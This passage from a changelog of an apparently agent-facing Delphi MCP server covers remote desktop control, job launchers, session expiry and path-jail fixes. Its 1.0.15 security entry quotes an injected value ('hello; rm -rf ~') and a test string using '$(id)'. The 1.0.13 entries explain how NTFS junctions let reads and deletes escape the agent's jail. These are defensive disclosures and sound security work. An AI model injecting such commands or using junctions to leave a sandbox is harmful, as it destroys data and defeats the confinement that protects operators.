project's. Measured here with one install only (37.0 pinned, 12.0 missing);
the two-versions case is to be measured on a machine that has them. "If the
agent does not know which Delphi it works with, it cannot search for it"
(David) - and a BDS number tells it nothing - so the version is NAMED
wherever it shows, with what the installation says of itself and nothing
composed by hand: `delphi_workspace` gives `activeDelphiName` ("RAD Studio
13", the IDE's own Personalities key), `activeDelphiPersonality` ("Delphi
13"), `activeDelphiEdition` ("Enterprise/Architect", from bds.exe),
`activeDelphiBuild` (the exe's full file version, patch level included) and
`activeDelphiRoot`; `delphi_installs` carries the same per install; every
`delphi_build` answer says which installation compiled (`delphiVersion`,
`delphiName`, `delphiBuild`). A field the machine does not have is simply
absent.

### Added - `delphi_rename_symbol mode=apply`: the rename is written, through the changeset engine
Preview was the whole tool since v0.53: an applicable rename came back as a
change list the agent staged by hand with `delphi_changeset`. `mode=apply`
does exactly that, by the same engine: the same analysis, and when
applicable one edit per touched line (the identifier replaced as a WORD, so a
qualified header keeps its class and two occurrences on a line change at
once), preview, commit - all files or none, fingerprints, a byte snapshot
first and a copy of each file in `__delphi-patch`. Not applicable = nothing
written, blockers given. The engine grew one public door for it
(`ChangesetBegin`, which `command=begin` now uses too) instead of a second
writer. A symbol with more than 100 uses is applied whole; only the
answer's `changes` list is capped. Measured on the battery's fixture: two
files, the project builds after the rename.

### Added - `delphi_adb screenshot` says what the display really is
`input tap` takes pixels of the display in force, not of the picture. The
screenshot answer now carries `image` (the PNG's size, read from its IHDR
header) and `display` - `physical`, `override` when set, `density` - from
`wm size` / `wm density`; when the image and the display in force differ,
`tapScale {x, y}` and a note that says to multiply what you measure before
tapping. A rotated display is not a scale (screencap and input share the
orientation), and a device whose `wm` says nothing answers as before.

### Added - HTTP sessions expire: `[Server] SessionTimeoutMinutes`
A session was forever: bound at `initialize`, it stayed known (and its
identity with it) until the process died. Now every request that carries an
`Mcp-Session-Id` touches it, and a session idle longer than
`SessionTimeoutMinutes` (default 720; 0 = never; decimals accepted) is dead:
the next request on it answers 404 with the reason - the same answer an id
this process never issued already got - and the client re-initializes, as the
streamable-HTTP contract says. Generous by default on purpose: every
re-initialize costs an agent a whole `tools/list`. While there, the two
registries of the same thing became one: the HTTP layer kept its own ring of
known ids next to the identity map in `Lsp.Guard` (two writers, one fact);
the registry now lives in `Lsp.Guard` alone, and a session is registered
with or without a `clientInfo.name`. Found by the new battery on the way: an
`initialize` that still carried the dead session's header answered 200 with
the OLD id echoed and the new one unregistered, so every call after it was a
404 - an `initialize` now announces and registers the new id whatever came
in the header. `delphi_workspace` reports the live
`sessions` and `sessionTimeoutMinutes` in force.

## [1.0.16-beta] - 2026-09-22

**A second day of field use, all measured on the machines.** An external agent
ran the 1.0.15 field test on two Linux desktops; every item below is what it
(or the operator) tripped over, fixed at the point where the rule lives.

### Changed - ONE desktop tool, and the machine is a parameter
`delphi_desktop` now drives the desktop of the machine behind a PAServer
profile - a Linux, a Windows, or this server itself when a PAServer runs in
its user session (`windows-local`, 127.0.0.1). Until 1.0.15 there were two
tools and two permission models for one thing: `delphi_adb_linux` (by
profile) and a local `delphi_desktop` (the node run in place, under its own
`AllowDesktopControl` switch). Decision of 2026-09-21: one path, PAServer and
a profile, the same switches as remote-run (`AllowRemoteRun`, `RemoteHosts`,
`RemoteRunProjects`). `delphi_adb_linux` stays one release as a deprecated
alias with the same parameters; `AllowDesktopControl` is gone. Per platform,
read from the profile: `key` takes an evdev code on Linux and a key NAME on
Windows (the other kind is refused, not translated), `windows` is thumbnails
on Linux and a list with rectangles on Windows, and a locked Windows answers
with a `hint`.

### Changed - ONE way to run anything on a target: a job file and a native launcher, no shell
PAServer on Windows executes no scripts: `--put` flag 5 is a bare
`CreateProcess` (a `.sh` is "not a valid Win32 application"), `paclient`
passes no arguments (the command PAServer runs carries an EMPTY argument
slot), and PAServer waits for what it launches with `paclient` blocked
meanwhile - all measured 2026-09-22, and on Linux exactly the same with an ELF
and flag 3. So EVERY remote execution - `remote-run` and every desktop
gesture, Linux or Windows - now sends a job file (`run-<job>.job`: binary,
output file, then ONE ARGUMENT PER LINE) and a native launcher (one source,
`src_run_job/`, shipped as `node\McpRunJob` for Linux and `node\McpRunJob.exe`
for Windows) named `run-<job>`, which PAServer executes: it writes
`___ENV=` with the SESSION it runs in (session 0 = a service, no desktop),
checks the binary is a PE (the ELF check of the script), starts it
unattended with its output in `<job>.out`, leaves a watcher (a copy of
itself on Windows, a forked child on Linux) that appends `___RC=` when the
program ends, and returns at once. The `/bin/sh` script the server used to
compose for Linux is gone, and with it every shell-quoting rule: **there is no
shell anywhere in the path**, arguments go from the job file to the
program's argv untouched. On Linux the launcher completes the graphical
environment in code (what the script did since this release's first entry).
Decision of the operator: one behaviour, not two branches. Measured on the
three targets with a probe that counts its arguments and sleeps: `uno "dos
tres" cuatro` arrives as three arguments on Zorin, Fedora and Windows, the
desktop node captures on the three, and the deploy folder is left clean.
Nothing is installed on the target.

### Added - a crop of the desktop when you need detail
The whole desktop stays the truth, but a small dialog on a big screen is
unreadable in it: the API shrinks every image to one fixed size, so a crop
buys detail, not tokens. `screenshot region="x,y,w,h"` returns just that
piece of the SAME capture, cropped on the server (`Lsp.Imagen`) so it works
on every target; `screenshot window="<part of a title>"` does the measuring
on a Windows target from the node's window list (refused on Linux, whose
desktop hands no rectangles out). Cropped answers carry `origin`, `region`
and `croppedFrom`, and the note spells the rule: press at origin + what you
measured - one frame, one coordinate space. Against the modal that used to
get agents lost when they looked at one window only, a cropped answer on
Windows also carries the whole `windows` list. Found while listing them:
the launcher, a console program, opened a console window on the user's
desktop with every gesture; it has no console now.

### Added - `delphi_paserver command=kill`: stop a job you started
A `remote-run` that outlives its timeout is left running on purpose, and
until now there was no way back short of the operator's keyboard. The
launcher now writes `<job>.pid` next to the program while it lives (its
watcher removes it when the program ends), and a job whose binary is the
verb `@kill` reads that `.pid` - of THAT deploy folder, never another - and
kills that process (SIGTERM, three seconds, SIGKILL on Linux;
`TerminateProcess` on Windows). `stillRunning` answers carry a `killNote`
with the exact call; `kill` takes the same switches as `remote-run` and can
only reach a job this server started for that project on that machine. A job
that already ended answers `killed=false`. Measured on Zorin and Windows.

### Docs - a Windows target is set up like a Linux one: PAServer first
Measured 2026-09-22 against a second Windows on the LAN: PAServer started
inside the user's session, the port opened in that machine's firewall (it was
ESET's, not Windows'), `add-profile platform=Win64`, and the first
`delphi_desktop` gesture deployed the node by itself - capture, window list,
crop and tap, nothing else installed there. README, TOOLS.md and the skill
now say it plainly: an agent reaches ANY desktop, Windows included, only
through a PAServer listening on that machine; there is no other channel.

### Fixed - Windows capture: a fallback when the screen says "Access denied"
The Windows node reads the desktop with one `BitBlt` from the screen DC, and
on 2026-09-22 that call answered `Access denied` at random with the session
active and unlocked - one capture refused, the next one fine, nothing on the
operator's screen to explain it. Every top-level window has its own surface
in the DWM, so when both `BitBlt` attempts fail the node now composes the
desktop window by window with `PrintWindow(PW_RENDERFULLCONTENT)` - from
another process, which is what makes it read the DWM buffer instead of
degenerating into `WM_PRINT` (a lesson already measured in Galatea in July) -
bottom to top in Z order over a grey background. What that capture lacks is
the cursor and the untitled shell windows (the taskbar); what it has is every
window with its real pixels, covered ones included. The node says so in a
`RESPALDO:` line and the `hint` about a locked Windows is only given when
there is NO capture. Measured with the fallback forced (the failure cannot be
provoked on demand: `MCPDESKTOP_SIN_BITBLT=1` in the node's environment skips
`BitBlt`): the same 3440x1440 desktop, 258 KB. While there, the `windows`
list - and the composition, which is built from it - leaves out the windows
that are "visible" but not on the desktop: minimized ones (their rectangle
lives at -32000), DWM-cloaked ones (store apps, other virtual desktops) and
click-through overlays (`WS_EX_TRANSPARENT`: the NVIDIA GeForce overlay and
an agent's cursor overlay showed up as two full-screen "windows" on the first
remote Windows measured, 2026-09-22 - they cannot be pressed, and on top of
the Z order they would have covered the whole composed capture).

### Fixed - `delphi_build target=Deploy` to a Windows PAServer shipped nothing
The minimal deployment manifest was only generated for non-Windows
platforms, so a Win64 deploy through a PAServer profile "succeeded" with an
empty folder on the target (found by the first `remote-run` against
`windows-local`). A platform is local only when no profile is given.

### Fixed - `remote-run` with PAServer running as a service
A PAServer started as a service is born outside the desktop session, so a
program with a window died at once on the target (GTK, exit 134, "Can't create
a GtkStyleContext without a display connection") while the desktop node kept
working, because it only needs D-Bus. Seen on a Fedora since 2026-09-19; the
project itself was carrying a launcher script that hard-coded ONE session's
`XAUTHORITY`. The run script (`Lsp.RemoteRun.GuionDeEjecucion`, the single
point every remote execution goes through) now completes only what is
MISSING - `XDG_RUNTIME_DIR`, the session D-Bus, `WAYLAND_DISPLAY`, `DISPLAY`,
the newest `XAUTHORITY` - from the session of the user PAServer runs as, and
the answer says which case it met in `graphicalEnv` (inherited / completed
with the list / no graphical session). Measured: Zorin (PAServer in session)
"inherited, nothing to add"; Fedora (systemd service) "completed
WAYLAND_DISPLAY, DISPLAY, XAUTHORITY" and GalateaFMX started there through
`remote-run` for the first time. Nothing is installed on the target.

### Fixed - `cannot find -lz`: the pulled sysroot lacked the `-dev` names
`get-sdk` pulls the libraries the target has; a target without the `-dev`
package has `libz.so.1` but not `libz.so`, the development name the linker
looks up, so a project using zlib stopped linking against both `zorin18` and
`fedora44` (it used to link against the mixed `Linux64.sdk` retired in
1.0.14, which happened to carry it). `delphi_build` now completes that name in
the SDK from the shortest versioned file it finds (a copy: Windows has no
symlinks without privilege; never over an existing `libX.so`), retries ONCE
and reports it in `sdkLinksCompleted` / `sdkLinkNote`; when the sysroot has
NO version at all the note says the target lacks the package itself.
Completing every name at pull time was measured and rejected: 2,117 names and
2.2 GB on one Zorin.

### Fixed - the project's SDK was read without looking at the platform
`set-sdk` writes `PlatformSDK` in the platform's own PropertyGroup, the way the
IDE does; the build read the FIRST `<PlatformSDK>` of the file, so a project
with Linux64 and macOS targets would have linked macOS against the Linux SDK.
One reader now (`Lsp.Dproj.PlatformProperty`, the inverse of the writers):
the platform's group first, a platform-less group as fallback, another
platform's group never. Battery: a `PlatformSDK` planted in the OSX64 group no
longer steers a Linux64 build.

### Added - `delphi_config view` says the SDK and the PAServer of each remote platform
The view showed the IDE default and the global profiles, and the agent had to
deduce what the PROJECT fixes (found by the field test). `section=platforms`
now carries `sdk` / `sdkSource` (`project`, IDE default, none) and `profile` /
`profileSource` on every remote platform, and the summary lists the enabled
ones under `remoteTargets`, each source naming the command that fixes it.

### Measured, kept for the roadmap
- The intermittent red of the concurrency battery (12 writers, 11 on disk,
  seen once on 2026-09-21) did not reproduce in 30 runs under CPU load; the
  release gate now keeps the whole log if it ever comes back.
- `sc.exe query` reports the service STOPPED up to ~30 s before its process
  exits: a deploy script must wait for the process, not the SCM state.

## [1.0.15-beta] - 2026-09-21

**The folder layout is the programmer's, and a long line no longer has to be
retyped.** Everything here was found by USING the tools live in a sandbox
workspace, not by a battery; the batteries were written afterwards.

### SECURITY - `delphi_adb_linux command=type` ran shell on the target
The text to type travelled UNQUOTED into the `/bin/sh` script that PAServer runs
on the target machine. The metacharacter filter was applied by the CALLER -
`remote-run` did, `delphi_adb_linux` did not - so `text="hello; rm -rf ~"` ran
its second half there. Found live: a text with parentheses broke the script's
syntax and the error showed how it travelled. Fixed at the single point every
argument goes through (`Lsp.RemoteRun.GuionDeEjecucion`): each argument is
single-quoted for sh, double quotes still group an argument with spaces, and
the text to type is a LITERAL argument of its own, never split. Measured
against a Fedora: `; touch X $(id) (p) 'q'` was typed verbatim, not run.
**Upgrade if you expose `delphi_adb_linux` to an agent you do not fully trust.**

### Fixed - the Linux node typed with a US keyboard
An evdev code is a POSITION, not a character: on a Spanish desktop `1015-14`
came out as `1015'14` while the node answered it had typed it right. Keypad
codes are not an answer - libei's virtual keyboard drops them silently
(measured). The node now asks the desktop for its keymap (libei hands it over
as XKB text) and resolves each character with `libxkbcommon`, loaded at runtime
like everything else, nothing to install: key + level (Shift, AltGr). `ñ`, `@`,
`¿`, capitals and punctuation now work, and the echo says which keyboard was
used (`Spanish, 159 characters`). Without a keymap it falls back to the old
table. Measured on a Fedora and a Zorin. The Windows node was never affected: it types Unicode.

### Added - fragment mode, in the whole editing family
The full-line anchor stays the rule: it exists so that nobody edits from
memory. But a README paragraph is ONE line of 600 characters, and turning
"68" into "69" meant pasting the whole line byte for byte - in 1.0.13 that
wall ended in a replace done outside the tool.

- `fragment` + `atline` (MANDATORY) + `new` changes just that piece of one
  line. The fragment must appear EXACTLY ONCE in that line, case-sensitive;
  zero or several is a refusal that shows the real line. No line breaks, and
  it does not combine with `old`, `delete`, `toline`, `insert` or
  `occurrence`.
- Nothing is relaxed: one resolver (`Lsp.Patch.FragmentoALinea`) turns the
  fragment into a full-line anchor, and the usual engine matches the WHOLE
  line again, with its whole audit, before writing.
- It serves the four doors an edit comes in by - `delphi_edit`,
  `delphi_textedit`, batches (`edits`) and `delphi_changeset` stage, where it
  is resolved when you stage it, so an ambiguous fragment is refused there and
  not at commit. One shared description for the three tools.

### Fixed - project subfolders (all four answered success)
- `delphi_create` ignored `dir` for everything but projects: the unit landed
  next to the .dpr. `dir` is now a SUBFOLDER of the project, relative and as
  deep as you like, registered with its relative path in the .dpr and the
  .dproj. It goes through the same whitelist as `set-output`
  (`ValidOutputFolder`): no absolute path, no drive, no `..`, no characters
  that could inject into the .dproj.
- The project finder of a unit climbed ONE level: a unit three folders below
  its .dpr had no project. It now climbs to the edge of the workspace, and
  never past what the token may read.
- Moving a whole FOLDER left the .dpr/.dproj pointing at nothing. The units
  inside are re-pointed.
- Deleting a whole FOLDER, the same: the units inside leave the project.
- `delphi_adb_linux`: a refused `out` answered "File name is empty" instead
  of the refusal (found on the first live call against a Linux node).

### Fixed - nobody decodes by hand
- `delphi_styles lint` read every .pas as strict UTF-8 "because lookups are
  ASCII" - but the FILE is not: one CP1252 source with an accent, the normal
  thing in a Delphi project with years on it, killed the whole lint with "No
  mapping for the Unicode character". The twin of the CESU-8 child-output bug.
- The same strict reader sat in the vault's single loader: `vault_read` died on
  a note saved as CP1252 by an old editor, and `vault_search` skipped it IN
  SILENCE - "no results" for something that was there. Also the session
  bootstrap, the mailbox and the output file of a remote run. All go through
  the house reader now (`Lsp.Patch.DecodeSourceBytes`); the vault still WRITES
  UTF-8 only.

### Fixed - re-running get-sdk was REFUSED
`paclient --get` is incremental: over a sysroot already on disk it copies only
what changed, often ZERO files. The tool read "0 copied" as "this distro does
not have that tree", so re-running `get-sdk` - what its own description tells
you to do after an OS upgrade on the target - ended in "the sysroot does not
match any distribution I know". Measured against a live Fedora. What decides
now is whether the tree IS on disk, not how many files came down today; such a
pull answers `already up to date`, and the result explains that the totals
count THIS run only. (Live-only: there is no PAServer in the batteries.)

### Added - the server says which account it runs as
`delphi_workspace` "server" carries `account`, plus an `accountWarning` when it
is LocalSystem: the IDE keeps its Library Path, packages, SDKs and profiles in
HKCU, so a service on the default account starts, answers and then fails with
F2613. It was in the README and nowhere the server could say it.
`test_service_smoke` gives service mode its first battery (it measures the
service that is ALREADY installed; a battery has no elevation to install one).

### Changed - what a tool says
- `delphi_symbols` now states that code inside an INACTIVE `{$IFDEF}` is not in
  the tree (measured: a `{$IFDEF LINUX}` routine was simply absent).
- "File not found" of the LSP tools told its own history instead of what to do.
- `delphi_desktop` states its design: it drives an OPEN desktop session (the
  console or a connected RDP) and does not work without one, on purpose - the
  user can watch what the agent does and step in. The no-capture answer says so
  and asks for the session, instead of "usually a locked session".
- `delphi_package` answers a `linuxNote` when the zip carries Linux executables:
  a zip made on Windows keeps no Unix permissions, so they come out of `unzip`
  not executable (`chmod +x` once).

### Measured - the third debt of 1.0.13
The settings cache between OVERLAPPING workspaces. One server, a wide token
rooted at a project and a narrow one rooted at a subfolder below the .dproj.
With the 1.0.12 exe as control, one call from the wide token was enough for
`delphi_definition` to hand the narrow one a path OUTSIDE its jail; since
1.0.13 the answer does not depend on who called first. `test_round48` keeps
the control: a battery that cannot see the bug in the binary that has it
measures nothing.

### Tests
- `test_round48` (cache key), `test_round49` (fragment mode, 22 checks, CP1252
  included), `test_round50` (subfolders, the project is built after each step).
- `run_all.py` starts and ends a full run with an EMPTY
  `%TEMP%\delphi-mcp-tests`: a battery that died halfway left its folder and a
  later run could lean on it and pass for the wrong reason. Measured: 3.5 GB
  of leftovers. A red run keeps its evidence.

## [1.0.14-beta] - 2026-09-21

**The jail has a floor, in the gate.** The pending list of 1.0.13, worked
through: the central gate now reads `[RutaDelServidor]`, the capture family
got one rule for `out`, and two of the three measurements that release owed
were paid.

### Added - the jail floor, for every tool, at the gate
The rule already lived in one function (`PathDenied` / `ReadPathDenied`);
what was never centralised was REMEMBERING to call it - about sixty calls by
hand across twenty units. The floor was first written on 2026-09-21
recognising paths by EXCLUSION, refused a `delphi_search` whose query merely
looked like a path, and was withdrawn the same day. It is back with the right
criterion: only arguments whose parameter carries `[RutaDelServidor]` - read
by RTTI from the real tool registry, keyed with the binder's own
`NormalizeKey` - and only ABSOLUTE paths (a relative one resolves against a
base that only the tool knows). It applies the WIDE rule (`ReadPathDenied`),
so it never refuses what a tool would have accepted: a redundant layer. The
per-tool checks stay, on purpose - the day someone removes them "because it
is centralised", an unmarked parameter becomes an unjailed path.

- `delphi_workspace` publishes `jailedParams`, because a redundant layer that
  went EMPTY would break nothing and nobody would notice. It said **42**, not
  the 39 of the census: there are 39 marks in the source and one is inherited
  by four tools. The census counted marks; the server counts parameters.
- `delphi_adb_linux.project` could never be probed outside the jail (the
  profile refusal came first). With the floor the jail answers at the gate,
  and that probe is now the proof the floor is alive.
- The audit had left four warnings for whoever wrote this gate. Verified
  against the code before building on them: two were right, **two were
  wrong** (there is no second vendor copy being compiled; and checking
  relative paths at the gate would refuse legitimate `delphi_config.path`
  calls).

### Changed - one rule for the `out` of every capture
It was a FOLDER in `delphi_desktop` and `delphi_adb_linux` and a mandatory
FILE ending in ".png" in `delphi_adb` - same idea, same parameter name,
different contract - with the file name composed by hand in three places. An
agent passing `out=...\shot.png` to `delphi_desktop` got a folder CALLED
`shot.png`. One function now, `CaptureTarget`: a folder (existing, or ending
in `\`, or without extension) or a file - and a file must carry the capture's
REAL extension, which comes from the capture itself, not from a constant. The
day a node returns something other than PNG the rule still holds, and nobody
receives an image wearing another format's extension: a mismatch is refused,
naming the real one. `delphi_adb`'s `out` becomes optional, like its sisters'.

### Fixed
- **`delphi_search` hid a build folder you asked for by name.** It filtered
  IDE artifacts on the ABSOLUTE path; its twin `delphi_list` does it on the
  path relative to the root, with the rule "if you name the build folder, you
  mean it". Searching inside `...\Win64\Release` - or in a jail hanging from
  a folder called `Debug` - answered zero hits, silently. Same rule now.
- **The trash of a folder you stop editing was kept forever.** The 15-day
  purge only ran from `BackupFile`. Walking every root at startup was
  measured and discarded (5.9 s on a tree of 8,869 folders - and a jail can
  be a whole disk), and so was an hourly background sweep: the walker behind
  `delphi_list` / `search` / `projects` ALREADY passes every trash folder, so
  it purges in passing - 0.012 ms when there is nothing to drop. Two brakes:
  a read-only credential purges nothing, and `PathDenied` decides whether
  that trash is ours to write, which leaves out ReadOnlyPaths, another
  agent's confined subtree and a "trash" that is a junction out of the jail.

### Tests
- New `test_round47`: the CESU-8 fall-through measured with a REAL child
  (`git show` of a file holding a CESU-8 surrogate pair), deliverables
  avoiding a read-only first root, the search/list rule, the purge in
  passing with both brakes.
- `test_round43` W5: the `out` rule, on `delphi_adb` always (it bites before
  the device is touched) and on a real desktop capture when the session can
  take one - and it says so when it cannot.
- Three fixtures followed deliberate contract changes: `test_guard`'s root
  check uses a legal `dest` so it still measures the ROOT rule rather than
  the floor; `test_round31` dates its trash today; `test_deploy_adb` no
  longer expects "screenshot needs out".

### Known issues
- Still owed: measuring the settings-cache key across overlapping workspaces.
  It does not need the IDE - only DelphiLSP, which the server spawns itself -
  but the resolved root shows in no answer, so it has to be measured by its
  effects.
- **Next**: `delphi_create` cannot place a unit in a SUBFOLDER of the project
  (it always lands next to the `.dpr`; today that takes a second step with
  `delphi_move` or `delphi_edit createunit` + `delphi_config add-unit`).
- The unit-creation race, seen once, never reproduced in 16 runs.

## [1.0.13-beta] - 2026-09-21

**The audit release.** A multi-agent review of v1.0.12 (12 independent
angles, 3 adversarial verifiers per finding, 173 agents) confirmed fifteen
defects; every one was then re-verified BY HAND against the live source
before touching anything - down to the RTL sources where the claim depended
on them - and every fix landed with its net. Two of the fifteen were jail
escapes that had survived every battery: both involved NTFS junctions, and
both are now measured with real `mklink /J` links in `test_round46`.

### Fixed - reading through a junction under ReadOnlyPaths escaped the jail
`PathDenied` caught the link with `RealPath` - and then `ReadPathDenied`'s
ReadOnlyPaths forgiveness re-checked the path BY TEXT and pardoned the very
refusal the link check had just produced: `delphi_fetch`, `delphi_read` and
`delphi_search` served files from OUTSIDE the jail whenever a junction sat
under a ReadOnlyPaths entry. The refusal now carries its REASON
(`TMotivoVeto`, a second `PathDenied` overload) and forgiveness goes by
motive - never by re-deriving the verdict, never by matching message text.
The same change retired the 'modo confinado' text-match the old code
apologised for, and stopped the library-zone pardon from giving vault and
anomaly refusals a second chance.

### Fixed - every recursive delete followed junctions to the other side
The RTL's `TDirectory.Delete(..., True)` recurses into anything carrying
the directory bit - a junction carries it - and deletes the files of the
TARGET (verified in the System.IOUtils sources: `WalkThroughDirectory`
never looks at the reparse bit). SIX call sites had it, including the
startup purge, which runs with nobody asking, and `delphi_delete`, which
the caller aims. There is now ONE tree deleter, `BorraArbol` in
`Lsp.Guard`: a reparse point is removed as an ENTRY - the link falls, its
target is never looked at - and all six sites go through it.

### Fixed - the restore echo leaked unmasked server paths
`delphi_edit` is exempt from the outbound drive mask (its echoes must stay
verbatim), so everything it COMPOSES itself must be masked by hand - the
obligation is written right where the exemption is. `RESTAURAR` /
`RESTAURADO` composed three absolute server paths and masked none: the
second emitter, one unit away from the comment that records the rule, for
the third time in three days. All three go through `MaskDriveText('', ...)`.

### Fixed - a stdio launch purged the temp of the live service
"Server and tray cannot run at once - they share the port" is false for
stdio, which opens no port and shares the folder next to the exe: a second
instance purged `__delphi-temp` while the first had files in flight (a git
commit's `-F` message, a remote-run capture). The startup purge now belongs
to the FIRST live instance of that exe only - a global mutex per exe
folder, held for life and inherited by the next start.

### Fixed - eight more, each verified before touching
- `delphi_edit` could write inside `__delphi-temp`: the ban lived in three
  of the four write doors, and the startup purge would silently eat the
  work. Now refused, like its twin always did.
- The UTF-8 branch of the child-output decoder was still unprotected:
  CESU-8 surrogates (what adb and gradle emit) pass the shape check and the
  strict decoder throws - the very crash 1.0.12 fixed in the OTHER branch.
  Both branches now fall through to the byte-safe net.
- The per-directory settings cache ignored WHICH workspace resolved it:
  with overlapping jails, the wide token's RootDir was handed to the
  narrow one, which then walked a root its own jail forbids. The cache key
  now carries the jail.
- `AgentTempDir` composed deliverables on `Roots[0]` even when that root
  is declared read-only - writing exactly where the server's own jail
  refuses the same path by hand. It now picks the first WRITABLE root.
- `delphi_package` zipped `__delphi-temp` - the one walker that COPIES
  files out of the workspace, and the folder now holds desktop captures of
  the operator. Skipped.
- The unserved-drive sentinel `srvx` was exactly what a genuinely served
  X: drive masks to: the namer stopped being injective and its inverse
  expanded the sentinel to `X:\`. The sentinel is now `srv0` - a digit can
  collide with nothing - refused by name like any unserved unit.
- Two parameters were misclassified: `delphi_config.path` (a server path
  in all three uses) carried neither the `[RutaDelServidor]` mark nor an
  exception comment, and `delphi_adb_linux.project`'s comment claimed "a
  NAME, not a path" while the code jails it 139 lines below. Both marked;
  the census in `Lsp.Attributes` and the README is 39 ours + 2 remote.
- Contract texts told yesterday's truth: the `out` descriptions of both
  desktop twins now say the folder is ON THIS SERVER, jailed, and where
  the default lands; the README no longer describes the discarded
  "first use" purge; the Linux twin's JSON reply is built under
  try/finally like its Windows sister.

### Fixed - every release zip shipped a month-old server binary
`DelphiLspMcpTray.exe` - the project's PREVIOUS name - was still listed in
the release payload. The tray has been a mode of the one executable (`-gui`)
for weeks and that project no longer exists (a battery even asserts so), but
its last build, dated 2026-08-20, kept sitting in the output folder and the
packager kept picking it up: every zip published since carried a server from
before v0.98, with that era's jail holes inside. Found while reviewing the
README for this release. **If you unpacked any earlier zip, delete
`DelphiLspMcpTray.exe`** and use `DelphiLspMcp.exe -gui`. The README also
caught up: battery counts (68 / 1,550+), the 43 tools, what the zip really
carries, the `srv0:` sentinel.

### Tests - four batteries measured nothing, and said otherwise
- round44 T6/T6b ran against a folder the previous check had just emptied:
  they stayed green with the filter deleted. They now plant a decoy, and
  T6c finally performs the writer/reader literal check that
  `Lsp.References` promised in writing.
- round45's discoverer only sees the LIVE tools/list, and without a vault
  the five conditional `vault_*` tools were invisible - their `path`
  parameters sat unclassified; the ">= 30 tools" floor would not notice an
  eight-tool cut. It now runs with a vault and a floor of 43 - and
  immediately caught three more unclassified parameters.
- Two EXCLUIDOS excuses claimed coverage that did not exist:
  `delphi_changeset.path/dest` are now probed for real, outside the jail
  (G2b, at stage time), and `delphi_adb_linux.project`'s excuse tells the
  truth.
- round43's W3d said "none of the three wrote outside" while checking two;
  W1b alone was vacuous with the session locked - W4c re-asserts it once
  capturing demonstrably works.
- New `test_round46` (14 checks): both junction escapes with real links,
  the restore mask, the `srv0` sentinel, the single-instance purge, the
  edit ban, the clean zip - plus, said out loud, what it cannot measure
  here: the CESU-8 fall-through needs a child emitting those bytes, the
  read-only-root case needs the desktop node, and the cache key needs two
  overlapping tokens with a live LSP. The code is fixed; those three
  measurements are still owed.

### Known issues
- The central gate reading `[RutaDelServidor]` is still pending. The audit
  also judged the reasoning behind the withdrawn floor in `Lsp.Guard.pas`:
  right for a REDUNDANT layer, wrong as the general slogan the note makes
  of it ("refusing must fail open") - and it left four warnings for
  whoever writes the gate. They are recorded in the project log and still
  have to be verified against the code before anyone builds on them.
- The `__delphi-patch` retention gap: a folder you stop editing keeps its
  copies forever (the purge is driven from `BackupFile`).
- `out` is a FOLDER in `delphi_desktop` and a FILE in `delphi_adb` - same
  family, different contract.
- `delphi_search` filters artifact folders on the absolute path while
  `delphi_list` uses the root-relative form plus the RootInArtifacts
  consent rule; the twins should agree.
- The unit-creation race, seen once, never reproduced in 16 runs.

## [1.0.12-beta] - 2026-09-21

**The parameter now says whose path it is.** One hole was closed, a folder
was given a home, and the thing underneath both was finally named: of the 200
parameters across 38 tools - all of them designed by us - not one recorded
the most basic fact about a path, which is whether it belongs to this machine.

### Fixed - the caller could choose where a screenshot of the operator's desktop landed
`delphi_desktop` and its Linux twin never checked `out`, the LOCAL destination
the caller picks. Measured with the real node against 1.0.11: a call got the
server to create a folder and write a capture of the operator's screen
**outside the jail**. Of the five caller-chosen output paths in the whole
contract, three were checked and two were not - and `delphi_adb` checks the
same parameter, by the same name, in the same kind of tool.

Both now vet it before touching anything remote, so a bogus profile or device
is not needed to see the refusal - an error of the caller's is answered
without first asking a machine that may take a minute not to reply.

### Fixed - the message explaining the failure was what crashed the tool
Found while cutting this release, and not by looking for it: `delphi_desktop`
had stopped working ENTIRELY - `command=status` included - and answered
`Error executing tool: No mapping for the Unicode character exists in the
target multi-byte code page`, which in this server's own rules means "I broke
inside". Nothing had broken. The published 1.0.11 failed identically at the
same moment, so it was never about this release.

The chain, measured: the machine could not copy the screen just then
("Acceso denegado" - a locked or disconnected session); the node said so in a
message carrying an accent (*"Controlador no **vá**lido"*); and the single
place that decodes a child process's output raised on that byte, because a
codepage that cannot represent a sequence makes `TEncoding.GetString` throw.
**The sentence that explained the real problem was the one that killed the
tool, and it hid the explanation behind an internal error.**

Decoding can no longer kill a call: the fallback is byte-by-byte and cannot
fail. Losing an accent is a defect; losing the output of a build is another
thing entirely - and this is the path `delphi_build`, `delphi_git`,
`delphi_test`, `delphi_adb` and `delphi_paserver` all capture through.

### New - `__delphi-temp`, sister of `__delphi-patch`
The server wrote its temporaries into the MACHINE's `%TEMP%`, by hand, in
seven places, outside every jail and without cleaning up. Measured on
2026-09-21: **56.4 MB** forgotten there - 33 captures of the operator's
desktop from two days earlier and a 10.7 MB remote-run output - plus a 10-byte
`.dproj` a battery had left loose, which had become the "project" of the units
of three other batteries.

One namer, two homes, and one criterion: `ServerTempDir` next to the
executable for what the agent never touches, `AgentTempDir` inside the
workspace for what it must FETCH. That second half is not tidiness:
`delphi_fetch` checks the jail, so the default screenshot destination in
`%TEMP%` made "download it with delphi_fetch" - which the tool promises in
writing - impossible. **The documented flow was broken end to end.** It works
now. The folder is emptied at startup: declaring it disposable is worthless if
nobody disposes of it.

### New - `[RutaDelServidor]`, the field that was missing
In the schema all 200 parameters are an identical `string`. The only way to
tell a path of ours from a path of the TARGET - or from something that merely
looks like one - was to read the prose description, one by one. The server
cannot do that; neither can the agent, which sees `path` and `exe` with
nothing saying that one is subject to the jail and the other is not.

That is why the jail check was decided by hand in ~60 places, from memory, by
whoever wrote the tool - and why `delphi_desktop.out` had none. Nobody forgot:
there was nowhere to declare it.

One marker, no enum, because the proportion says so: of the 39 path
parameters **37 are ours and exactly two belong to the target machine**
(`delphi_paserver.exe`, `delphi_config.remotedir`, plus
`delphi_adb_linux.project`, which is a name). Mark ours; what carries no mark
the gate will not look at. And the three exceptions now carry a comment saying
WHY they have none, because an exception without its reason written down is
where the next one slips through.

Marking what IS a path rather than what is not is not arbitrary: the opposite
was tried the same day and died. Recognising paths by an exclusion list killed
a `delphi_search` whose query was `D:\Proyectos`. An exclusion list is fine
for REWRITING, where being wrong is harmless; to REFUSE you must fail open on
what you do not know. That attempt is kept, unused, with the note.

### Measured
- `tests/test_round43.py` (9 checks, 3 failing against 1.0.11 - one of them
  the capture actually written outside the jail, with the real node).
- `tests/test_round44.py` (10 checks, 7 failing against 1.0.11).
- `tests/test_round45.py` (4 checks): the guardian. It reads the LIVE
  contract, refuses to let a path-looking parameter go unclassified, hands an
